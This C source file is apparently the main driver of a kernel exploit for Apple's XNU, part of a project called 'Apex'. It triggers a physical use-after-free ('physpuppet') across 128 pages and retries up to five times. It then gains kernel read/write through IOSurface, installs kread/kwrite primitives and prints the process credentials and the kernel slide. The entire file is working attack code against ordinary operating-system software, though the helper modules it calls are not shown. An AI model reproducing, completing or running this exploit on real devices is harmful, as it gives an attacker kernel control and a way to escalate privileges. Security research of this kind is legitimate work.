//
//  exploit.c
//  Apex
//
//  Created by Alfie on 27/08/2024.
//

#include "exploit.h"
#include "puaf.h"
#include "info.h"
#include "surface.h"
#include "krw.h"

#include <mach/vm_types.h>
#include <mach/mach_init.h>
#include <mach/mach_host.h>
#include <mach/vm_map.h>
#include <mach/mach_port.h>
#include <mach/message.h>
#include <mach/mach.h>
#include <stdbool.h>
#include <stdlib.h>

#define PUAF_PAGES 128
uint64_t puafPages[PUAF_PAGES];

int exploit_init(void) {
    memset(puafPages, 0, PUAF_PAGES * sizeof(uint64_t));
    int nTries = 0;
    
    io_connect_t client = 0;
retry:
    iosurface_init(&client);
    copy_init();
    
    
    nTries += 1;
    physpuppet_run(PUAF_PAGES, puafPages);
    if (!puaf_check_free_pages(PUAF_PAGES, puafPages)) {
        printf("Failed to grab enough free pages\n");
        physpuppet_deinit(PUAF_PAGES, puafPages, 0);
        copy_deinit();
        if (nTries <= 5) goto retry;
        return -1; // Failed to grab enough free pages
    }
    
    uint64_t task = 0, puafPage = 0;
    int r = iosurface_krw(client, puafPages, PUAF_PAGES, &task, &puafPage);
    if (r) {
        printf("Failed to get IOSurface kernel r/w!\n");
        iosurface_deinit(puafPages);
        physpuppet_deinit(PUAF_PAGES, puafPages, 0);
        copy_deinit();
        if (nTries <= 5) goto retry;
        return r;
    }
    printf("Exploit succeeded!\n");
    
    // The rest of the primitives are up to the reader to complete
    gPrimitives.kread32 = iosurface_kread32;
    gPrimitives.kread64 = iosurface_kread64;
    gPrimitives.kwrite32 = iosurface_kwrite32;
    gPrimitives.kwrite64 = iosurface_kwrite64;
    gPrimitives.kwritebuf = iosurface_kwritebuf;
    gPrimitives.kreadbuf = iosurface_kreadbuf;
    
    info_init(task);
    
    physpuppet_deinit(PUAF_PAGES, puafPages, puafPage);
    copy_deinit();
    
    printf("Our task: 0x%llx\n", gTask);
    printf("Our proc: 0x%llx\n", gProc);
    printf("Our ucred: 0x%llx\n", gUcred);
    printf("Kernel slide: 0x%llx\n", get_kernel_slide());
    
    return 0;
}

void exploit_deinit(void) {
    iosurface_deinit(puafPages);
}
